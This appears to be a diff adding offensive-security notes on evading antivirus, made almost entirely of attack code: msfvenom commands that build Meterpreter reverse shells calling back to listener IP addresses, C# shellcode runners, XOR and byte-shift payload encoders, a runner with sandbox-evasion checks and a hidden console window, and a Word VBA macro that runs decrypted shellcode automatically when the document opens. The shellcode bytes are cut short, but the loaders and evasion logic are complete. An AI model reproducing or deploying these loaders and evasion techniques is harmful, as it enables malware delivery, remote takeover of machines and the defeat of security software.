@@ -1,0 +1,317 @@
+*************************** Bypassing Antivirus with C#   ***************************
+
+# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.232 LPORT=443 EXITFUNC=thread -f csharp
+
+        using System;
+        using System.Diagnostics;
+        using System.Runtime.InteropServices;
+        using System.Net;
+        using System.Text;
+        using System.Threading;
+        
+        namespace AV
+        {
+            class Program
+            {
+                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+                static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+                    uint flAllocationType, uint flProtect);
+        
+                [DllImport("kernel32.dll")]
+                static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+                    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+                          uint dwCreationFlags, IntPtr lpThreadId);
+        
+                [DllImport("kernel32.dll")]
+                static extern UInt32 WaitForSingleObject(IntPtr hHandle,
+                    UInt32 dwMilliseconds);
+                static void Main(string[] args)
+                {
+                    byte[] buf = new byte[599] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,};
+                    int size = buf.Length;
+                    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                    Marshal.Copy(buf, 0, addr, size);
+                    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,IntPtr.Zero, 0, IntPtr.Zero);
+                    WaitForSingleObject(hThread, 0xFFFFFFFF);
+                }
+            }
+        }
+
+************************ XOR helper and adding decryption routine  C#   ***********************
+
+        using System;
+        using System.Diagnostics;
+        using System.Runtime.InteropServices;
+        using System.Net;
+        using System.Text;
+        using System.Threading;
+        
+        namespace AV
+        {
+            class Program
+            {
+                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+                static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+                    uint flAllocationType, uint flProtect);
+        
+                [DllImport("kernel32.dll")]
+                static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+                    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+                          uint dwCreationFlags, IntPtr lpThreadId);
+        
+                [DllImport("kernel32.dll")]
+                static extern UInt32 WaitForSingleObject(IntPtr hHandle,
+                    UInt32 dwMilliseconds);
+                static void Main(string[] args)
+                {
+                    byte[] buf = new byte[647] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,};
+                    for (int i = 0; i < buf.Length; i++)
+                    {
+                        buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+                    }
+                    int size = buf.Length;
+                    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                    Marshal.Copy(buf, 0, addr, size);
+                    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                    WaitForSingleObject(hThread, 0xFFFFFFFF);
+                }
+            }
+        }
+
+****************************** Encrypting the C# Shellcode Runner  ******************************
+
+// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
+
+        ﻿using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Threading.Tasks;
+        
+        namespace XorCoder
+        {
+            public class Program
+            {
+                public static void Main(string[] args)
+                {
+                    
+                    byte[] buf = new byte[511] {0xfc, };
+                    // Encode the payload with XOR (fixed key)
+                    byte[] encoded = new byte[buf.Length];
+                    for (int i = 0; i < buf.Length; i++)
+                    {
+                        encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
+                    }
+                    StringBuilder hex;
+        
+                    if (args.Length > 0)
+                    {
+                        switch (args[0])
+                        {
+                            case "-VBA":
+                                // Printout VBA payload
+                                uint counter = 0;
+        
+                                hex = new StringBuilder(encoded.Length * 2);
+                                foreach (byte b in encoded)
+                                {
+                                    hex.AppendFormat("{0:D3}, ", b);
+                                    counter++;
+                                    if (counter % 25 == 0)
+                                    {
+                                        hex.Append("_\n");
+                                    }
+                                }
+                                Console.WriteLine($"XORed VBA payload (key: 0xfa):");
+                                Console.WriteLine(hex.ToString());
+                                break;
+                            default:
+                                Console.WriteLine("Accepted arguments: -VBA to print VBA payload instead of C#");
+                                break;
+                        }
+                    }
+                    else
+                    {
+                        // Printout C# payload
+                        hex = new StringBuilder(encoded.Length * 2);
+                        int totalCount = encoded.Length;
+                        for (int count = 0; count < totalCount; count++)
+                        {
+                            byte b = encoded[count];
+        
+                            if ((count + 1) == totalCount) // Dont append comma for last item
+                            {
+                                hex.AppendFormat("0x{0:x2}", b);
+                            }
+                            else
+                            {
+                                hex.AppendFormat("0x{0:x2}, ", b);
+                            }
+        
+                            if ((count + 1) % 15 == 0)
+                            {
+                                hex.Append("\n");
+                            }
+                        }
+        
+                        Console.WriteLine($"XORed C# payload (key: 0xfa):");
+                        Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");
+                    }
+                    // Decode the XOR payload
+                    /*
+                    for (int i = 0; i < buf.Length; i++)
+                    {
+                        buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+                    }
+                    */
+                }
+            }
+
+****************************** Sleep timers C# Shellcode Runner  ******************************
+
+        using System;
+        using System.IO;
+        using System.Diagnostics;
+        using System.Runtime.InteropServices;
+        using System.Net;
+        using System.Text;
+        using System.Threading;
+        
+        namespace Met
+        {
+            class Program
+            {
+            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        
+            [DllImport("kernel32.dll")]
+            static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        
+            [DllImport("kernel32.dll")]
+            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+        
+            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+            static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+        
+            [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
+        
+            [DllImport("kernel32.dll")]
+            static extern IntPtr GetCurrentProcess();    
+        
+            [DllImport("kernel32.dll")]
+            static extern IntPtr GetConsoleWindow();
+        
+            [DllImport("user32.dll")]
+            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+            const int SW_HIDE = 0;
+            const int SW_SHOW = 5;
+            static void Main(string[] args)
+                {
+                    var handle = GetConsoleWindow();
+                    ShowWindow(handle, SW_HIDE);
+                    //Sleep timer bypass
+                    DateTime t1 = DateTime.Now;
+                    Sleep(2000);
+                    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+                    if (t2 < 1.5) {
+                        return;
+                    }
+                    Console.WriteLine("Sleep timer bypassed!");
+                    //Non emulated api's
+                    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+                    if (mem == null) {
+                        return;
+                    }
+                    Console.WriteLine("Emulation done!");
+                    byte[] buf = new byte[796] {0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02};
+                    byte[] encoded = new byte[buf.Length];
+                    for (int i = 0; i < buf.Length; i++)
+                    {
+                    encoded[i] = (byte)(((uint)buf[i] - 2) & 0xff);
+                    }
+                    buf = encoded;
+                    Console.WriteLine("Cipher decrypted!");
+                    int size = buf.Length;
+                    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                    Console.WriteLine("Allocation Complete!");
+                    Marshal.Copy(buf, 0, addr, size);
+                    Console.WriteLine("Copy done!");
+                    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                    Console.WriteLine("Thread Created");
+                    WaitForSingleObject(hThread, 0xFFFFFFFF);
+                  }
+              }
+            }
+          }
+
+******************************** Bypassing Antivirus in VBA ********************************
+
+# VBA encrypter
+
+msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.X.Y LPORT=8080 -f csharp
+
+        using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Threading.Tasks;
+        namespace EncryptVBA
+        {
+         class Program
+         {
+         static void Main(string[] args)
+         {
+         byte[] buf = new byte[640] {0xfc,0xe8,0x82,0x0 };
+         byte[] encoded = new byte[buf.Length];
+         for (int i = 0; i < buf.Length; i++)
+         {
+         encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
+         }
+         uint counter = 0;
+         StringBuilder hex = new StringBuilder(encoded.Length * 2);
+         foreach (byte b in encoded)
+         {
+         hex.AppendFormat("{0:D}, ", b); 
+         counter++;
+         if (counter % 50 == 0)
+         {
+         hex.AppendFormat("_{0}", Environment.NewLine);
+         }
+         }
+         Console.WriteLine("The payload is: " + hex.ToString());
+         }
+         }
+        }
+
+# VBA Code
+
+        Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As
+        Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As 
+        LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+        Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, 
+        ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+        Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As 
+        LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+        Sub MyMacro()
+        Dim buf As Variant
+        Dim addr As LongPtr
+        Dim counter As Long
+        Dim data As Long
+        Dim res As Long
+        buf = Array(EncryptedShellCode)
+        For i = 0 To UBound(buf)
+         buf(i) = buf(i) - 2
+        Next i
+        addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+        For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+        Next counter
+        res = CreateThread(0, 0, addr, 0, 0, 0)
+        End Sub
+        Sub Document_Open()
+        MyMacro
+        End Sub
+        Sub AutoOpen()
+        MyMacro
+        End Sub
